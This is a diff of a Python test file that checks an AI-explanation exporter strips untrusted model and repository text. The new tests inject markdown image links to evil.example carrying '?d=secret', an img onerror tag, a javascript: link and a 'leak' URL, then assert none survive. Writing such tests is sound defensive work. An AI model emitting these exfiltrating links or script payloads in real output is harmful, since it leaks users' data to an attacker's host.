@@ -151,7 +151,7 @@ def test_the_diagram_text_cannot_carry_directives_html_or_links(bundle):
     assert not [line for line in text.splitlines() if line.strip().startswith(("click", "%%", "style", "linkStyle"))]
     assert text.count('"') == 2 * len(graph["nodes"])
     svg = explain.svg(graph)
-    assert "<script" not in svg and "&lt;script" in svg
+    assert "<script" not in svg and "<" not in svg.split("</defs>")[1].replace("<path", "").replace("<text", "").replace("</text>", "").replace("<g ", "").replace("</g>", "").replace("<rect", "").replace("</svg>", "")
 
 
 def test_markdown_export_has_the_diagram_evidence_and_limits(bundle):
@@ -205,3 +205,23 @@ def test_the_endpoint_comes_from_the_operator_and_must_be_https():
     with pytest.raises(ValueError):
         explain.provider_from_environment({"UPGRADEGUARD_EXPLAIN_URL": "http://models.example/v1", "UPGRADEGUARD_EXPLAIN_MODEL": "m"})
     assert explain.provider_from_environment({"UPGRADEGUARD_EXPLAIN_URL": "https://models.example/v1", "UPGRADEGUARD_EXPLAIN_MODEL": "m"}).model == "m"
+
+
+def test_model_text_cannot_smuggle_links_images_or_html_into_the_markdown(bundle):
+    graph = good_graph(ids_of(bundle))
+    graph["summary"] = "Done. ![x](https://evil.example/?d=secret) <img src=x onerror=1> [click](javascript:alert(1)) see www.evil.example"
+    graph["limitations"] = ["Read http://evil.example/leak now", "[a](b)"]
+    graph["findings"][0]["text"] = "![i](https://evil.example/p.png)"
+    result = explain.explain(bundle, provider=MockProvider(graph))
+    assert result["used_model"]
+    text = explain.markdown(result["graph"], result["evidence"], result["source"], result["extra_limitations"])
+    for forbidden in ("evil", "![", "](", "<img", "javascript", "www."):
+        assert forbidden not in text.lower()
+    assert "Done." in text
+
+
+def test_repository_text_in_the_evidence_lines_is_made_plain_too(bundle):
+    bundle["diff"]["tests"]["regressions"][0]["test"] = "tests/test_a.py::test_[x](https://evil.example/leak)"
+    result = explain.explain(bundle)
+    text = explain.markdown(result["graph"], result["evidence"], result["source"], [])
+    assert "://" not in text and "](" not in text and "[x]" not in text
